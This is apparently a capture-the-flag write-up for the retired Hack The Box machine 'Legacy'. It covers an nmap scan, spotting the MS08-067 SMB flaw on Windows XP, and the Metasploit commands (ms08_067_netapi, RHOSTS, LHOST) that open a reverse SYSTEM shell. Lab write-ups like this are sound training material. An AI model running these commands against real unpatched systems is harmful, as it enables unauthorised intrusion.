# HTB - Legacy (Retired)

## Machine Information

| Field | Value |
|------|------|
| Machine Name | Legacy |
| Platform | Hack The Box |
| Difficulty | Easy |
| OS | Windows |
| IP | 10.129.x.x |

---

## Disclaimer

This write-up is for educational purposes only.  
The machine is retired from Hack The Box and no longer active.

---

# Attack Path

1. Perform a full TCP port scan
2. Identify SMB service running on Windows XP
3. Detect vulnerability **MS08-067 (CVE-2008-4250)**
4. Exploit the vulnerability to gain SYSTEM shell
5. Retrieve user and root flags

---

# Reconnaissance

## Nmap Scan

```bash
nmap -Pn -sS -sV -p- 10.129.x.x
```
### Result
```
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```
The open SMB port suggests a Windows file sharing service.

## Enumeration

Further enumeration indicates the machine is running Windows XP.

This OS is known to be vulnerable to:
<br>**CVE-2008-4250 (MS08-067)**

A remote code execution vulnerability in the Windows Server service.

## Exploitation
### Exploit Used
MS08-067 Remote Code Execution
<br>Example exploit execution:
```
python ms08_067_exploit.py 10.129.x.x
```
Alternatively using Metasploit:
```
msfconsole
```
```
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.129.x.x
set LHOST <your_ip>
run
```

## Foothole
After running the exploit, a reverse shell is obtained
verify access:
```
whoami
```
output:
```
nt authority\system
```
The exploit directly povides SYSTEM-level access

## Flags
### User Flag
```C:\Documents and Settings\john\Desktop\user.txt```
### Root Flag
```C:\Documents and Settings\Administrator\Desktop\root.txt```

## Lessons Learned
- SMB enumeration is critical during reconnaissance
- Old Windows systems are often vulnerable to MS08-067
- Public exploits can provide immediate SYSTEM access
  
## Tools Used
- Nmap
- Metasploit
- Python exploit
  
## References
https://nvd.nist.gov/vuln/detail/CVE-2008-4250<br>
https://www.exploit-db.com/exploits/40279